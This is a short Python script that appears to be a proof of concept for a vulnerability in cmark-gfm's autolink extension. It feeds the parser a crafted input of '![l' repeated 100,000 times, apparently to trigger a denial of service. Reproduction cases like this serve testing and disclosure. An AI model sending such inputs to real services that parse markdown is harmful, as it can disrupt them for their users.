import subprocess

# This simulates the command that would trigger the vulnerability
input_data = "![l" * 100000 + "\n"

# Execute cmark-gfm with the autolink extension enabled
subprocess.run(["./cmark-gfm", "-e", "autolink"], input=input_data.encode())